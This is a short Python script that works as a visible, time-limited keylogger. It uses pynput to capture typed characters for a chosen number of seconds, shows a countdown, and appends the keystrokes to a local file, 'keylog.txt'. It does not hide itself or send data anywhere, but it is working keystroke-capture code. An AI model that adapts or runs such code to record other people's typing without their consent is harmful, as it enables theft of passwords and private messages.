from pynput import keyboard
import time
import sys

def clear_line():
    sys.stdout.write("\033[K")  # Clear line
    sys.stdout.flush()

def keyPressed(key):
    global key_buffer
    try:
        char = key.char
        key_buffer.append(char)
    except AttributeError:
        # If the pressed key is not a character
        pass

def writeToFile():
    # Function to write keys from buffer to file
    if key_buffer:
        with open("keylog.txt", 'a') as logkey:
            logkey.write(''.join(key_buffer))

def printRemainingTime(duration, remaining_time):
    clear_line()
    print("Remaining time: {} seconds".format(int(remaining_time)), end='\r')

def runKeylogger(duration):
    global key_buffer
    key_buffer = []  # Buffer to store keys during the logging period

    # Print total duration
    print("Time duration to run: {} seconds".format(duration))

    # Start keylogger
    with keyboard.Listener(on_press=keyPressed) as listener:
        # Run the keylogger for the specified duration
        start_time = time.time()
        while time.time() - start_time < duration:
            remaining_time = duration - (time.time() - start_time)
            printRemainingTime(duration, remaining_time)
            time.sleep(1)  # Update every second
        
        # Stop listener
        listener.stop()

    # Write keys to file after the duration
    writeToFile()
    clear_line()

if __name__ == "__main__":
    # Display instructions and take input
    print("Enter the duration for which you want to run the keylogger (in seconds):")
    duration = int(input())

    # Run the keylogger for the specified duration
    runKeylogger(duration)

    # Display the path of the file
    print("Keys logged to 'keylog.txt'")
